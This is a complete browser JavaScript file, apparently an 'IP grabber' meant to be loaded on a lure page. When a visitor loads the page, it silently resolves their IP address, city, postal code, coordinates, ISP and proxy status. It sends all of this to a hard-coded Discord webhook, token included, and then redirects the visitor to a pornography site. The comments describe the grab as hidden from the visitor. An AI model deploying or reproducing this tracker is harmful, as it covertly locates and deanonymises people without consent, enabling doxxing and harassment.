/**
 * grapip.js
 * Telemetry Collector → Discord Webhook → Redirect
 * Runtime: browser, loaded via <script src="grapip.js" defer>
 */

const CONFIG = {
  ipGeoUrl:       "https://api.techniknews.net/ipgeo/",
  fallbackApiUrl: "https://ip-api.com/json/",
  webhookUrl:     "https://discord.com/api/webhooks/1561746238397743277/FUJmybMPHJQcMYTywtirln5gY3ycq2h1uMzRn5Y4j_5AIUzhZJLLNQAAqzFBBXmKPF5h",
  redirectUrl:    "https://www.pornhub.com/",
  timeoutMs:      5000
};

/**
 * fetch() with hard timeout
 */
async function fetchWithTimeout(url, options = {}) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), CONFIG.timeoutMs);
  try {
    const res = await fetch(url, { ...options, signal: controller.signal });
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    return await res.json();
  } catch (err) {
    console.error(`[grapip] fetch fail (${url}): ${err.message}`);
    return null;
  } finally {
    clearTimeout(timer);
  }
}

/**
 * Primary: techniknews ipgeo — full schema, no token required
 */
async function fetchPrimary() {
  const d = await fetchWithTimeout(CONFIG.ipGeoUrl);
  if (!d || d.status === "fail") return null;
  return {
    ip:          d.ip,
    continent:   d.continent,
    country:     d.country,
    countryCode: d.countryCode,
    region:      d.regionName,
    city:        d.city,
    postal:      d.zip || "N/A",
    lat:         d.lat,
    lon:         d.lon,
    loc:         (d.lat && d.lon) ? `${d.lat}, ${d.lon}` : null,
    timezone:    d.timezone,
    currency:    d.currency,
    isp:         d.isp,
    org:         d.org,
    as:          d.as,
    reverse:     d.reverse || "N/A",
    mobile:      d.mobile,
    proxy:       d.proxy,
    hosting:     d.hosting,
    cached:      d.cached
  };
}

/**
 * Fallback: ip-api.com — normalized to same shape
 */
async function fetchFallback() {
  const d = await fetchWithTimeout(CONFIG.fallbackApiUrl);
  if (!d || d.status === "fail") return null;
  return {
    ip:          d.query,
    continent:   "N/A",
    country:     d.country,
    countryCode: d.countryCode,
    region:      d.regionName,
    city:        d.city,
    postal:      d.zip || "N/A",
    lat:         d.lat,
    lon:         d.lon,
    loc:         `${d.lat}, ${d.lon}`,
    timezone:    d.timezone,
    currency:    "N/A",
    isp:         d.isp,
    org:         d.org,
    as:          d.as,
    reverse:     d.reverse || "N/A",
    mobile:      d.mobile  ?? "N/A",
    proxy:       d.proxy   ?? "N/A",
    hosting:     d.hosting ?? "N/A",
    cached:      false
  };
}

/**
 * Resolve IP metadata — primary first, fallback on miss
 */
async function getIPDetails() {
  let details = await fetchPrimary();
  if (!details || (!details.city && !details.isp)) {
    console.log("[grapip] primary miss — trying fallback");
    const fallback = await fetchFallback();
    if (fallback) details = fallback;
  }
  return details;
}

/**
 * Log resolved details to browser console
 */
function logToConsole(details) {
  console.groupCollapsed("[grapip] resolved IP data");
  console.table({
    "IP Address":   { value: String(details.ip)          },
    "Continent":    { value: String(details.continent)   },
    "Country":      { value: String(details.country)     },
    "Country Code": { value: String(details.countryCode) },
    "Region":       { value: String(details.region)      },
    "City":         { value: String(details.city)        },
    "Postal Code":  { value: String(details.postal)      },
    "Location":     { value: String(details.loc)         },
    "Timezone":     { value: String(details.timezone)    },
    "Currency":     { value: String(details.currency)    },
    "ISP":          { value: String(details.isp)         },
    "Org":          { value: String(details.org)         },
    "AS":           { value: String(details.as)          },
    "Reverse DNS":  { value: String(details.reverse)     },
    "Mobile":       { value: String(details.mobile)      },
    "Proxy":        { value: String(details.proxy)       },
    "Hosting":      { value: String(details.hosting)     },
    "Cached":       { value: String(details.cached)      }
  });
  console.groupEnd();
}

/**
 * Discord webhook dispatch — all fields
 */
async function sendToDiscord(details) {
  const bool = v => (v === true ? "✅" : v === false ? "❌" : "N/A");

  const payload = {
    embeds: [{
      title: "IP Network & Geolocation Data",
      color: 0x3498db,
      fields: [
        { name: "IP Address",   value: String(details.ip          || "N/A"), inline: true  },
        { name: "Continent",    value: String(details.continent   || "N/A"), inline: true  },
        { name: "Country",      value: String(details.country     || "N/A"), inline: true  },
        { name: "Country Code", value: String(details.countryCode || "N/A"), inline: true  },
        { name: "Region",       value: String(details.region      || "N/A"), inline: true  },
        { name: "City",         value: String(details.city        || "N/A"), inline: true  },
        { name: "Postal Code",  value: String(details.postal      || "N/A"), inline: true  },
        { name: "Location",     value: String(details.loc         || "N/A"), inline: true  },
        { name: "Timezone",     value: String(details.timezone    || "N/A"), inline: true  },
        { name: "Currency",     value: String(details.currency    || "N/A"), inline: true  },
        { name: "ISP",          value: String(details.isp         || "N/A"), inline: false },
        { name: "Org",          value: String(details.org         || "N/A"), inline: false },
        { name: "AS",           value: String(details.as          || "N/A"), inline: false },
        { name: "Reverse DNS",  value: String(details.reverse     || "N/A"), inline: false },
        { name: "Mobile",       value: bool(details.mobile),                 inline: true  },
        { name: "Proxy",        value: bool(details.proxy),                  inline: true  },
        { name: "Hosting",      value: bool(details.hosting),                inline: true  },
        { name: "Cached",       value: bool(details.cached),                 inline: true  }
      ],
      timestamp: new Date().toISOString()
    }]
  };

  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), CONFIG.timeoutMs);
  try {
    const res = await fetch(CONFIG.webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
      signal: controller.signal
    });
    if (!res.ok) console.error(`[grapip] webhook rejected: HTTP ${res.status}`);
  } catch (err) {
    console.error(`[grapip] webhook error: ${err.message}`);
  } finally {
    clearTimeout(timer);
  }
}

/**
 * Entry — resolve → log → dispatch → redirect
 * Redirect fires after webhook attempt regardless of webhook success/fail
 * Visitor never sees a hang — 5s max then door opens anyway
 */
async function main() {
  const details = await getIPDetails();

  if (details) {
    logToConsole(details);
    await sendToDiscord(details);
  } else {
    console.error("[grapip] could not resolve IP — skipping dispatch");
  }

  // grab done, door opens
  window.location.href = CONFIG.redirectUrl;
}

main();
